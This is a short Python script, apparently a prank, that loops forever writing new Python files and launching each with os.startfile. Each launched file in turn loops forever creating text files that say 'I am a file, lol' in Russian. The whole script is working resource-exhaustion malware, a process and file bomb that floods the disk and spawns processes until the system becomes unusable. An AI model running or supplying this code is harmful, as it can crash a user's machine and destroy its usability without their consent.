import os
a=0
b=0
while a!=-1:
    my_file = open("SpamProgram"+str(a)+".py", "w+",  encoding="utf-8")
    my_file.write("""a=0
while a!=-1:
    my_file = open('"""+str(b)+"""'+"SpamFile"+str(a)+".txt", "w+")
    my_file.write("Я файл, лол.")
    my_file.close()
    a=a+1""")
    my_file.close()
    os.startfile("SpamProgram"+str(a)+".py")
    a=a+1
    b=b+1
